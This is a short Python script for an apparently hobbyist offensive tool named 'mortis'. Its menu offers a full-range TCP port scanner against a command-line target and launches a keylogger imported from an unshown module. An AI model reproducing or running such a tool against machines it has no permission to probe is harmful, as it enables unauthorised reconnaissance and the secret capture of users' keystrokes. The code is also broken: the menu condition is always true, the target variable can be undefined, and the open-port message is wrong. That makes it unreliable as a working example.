from keylog import key_logger
import colorama
import socket
import sys
import pyfiglet
import logging
from pynput.keyboard import Key, Listener
def port_scanner():
    banner = pyfiglet.figlet_format("portscanner")
    print(banner)

    if len(sys.argv) == 2:
        target = socket.gethostbyname(sys.argv[1])
    else:
        print("invalid argument")
        print("syntax: python <filename> <target-ip>")

    print("="*50)
    print(f"scanning target {target}")
    print("="*50)

    try:
        for port in range(65001):
            s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
            socket.setdefaulttimeout(1)

            result = s.connect_ex((target, port))

            if result == 0:
                print("[ + ] 0 PORTS ARE OPEN")
            else:
                print(result)
            s.close()
    except KeyboardInterrupt:
        print('\033[29m'+"[ + ] SHUTTING DOWN PROGRAM")
        sys.exit()
    except socket.gaierror:
        print('\033[28m'+"[ + ] SHUTTING DOWN PROGRAM")
        sys.exit()

    except socket.error:
        print("[ + ] SHUTTING DOWN PROGRAM")
        sys.exit()

# creating keylogger..


        # banner2 = pyfiglet.figlet_format("mortis")
        # print(banner2)
menu = """
     1. scan for open ports
     2. start keylogger
"""
options = input('\033[32m'"mortis/>")
if options == "help" or "list":
     print(menu)
elif options == "1":
        port_scanner()
elif options == "2":
        key_logger()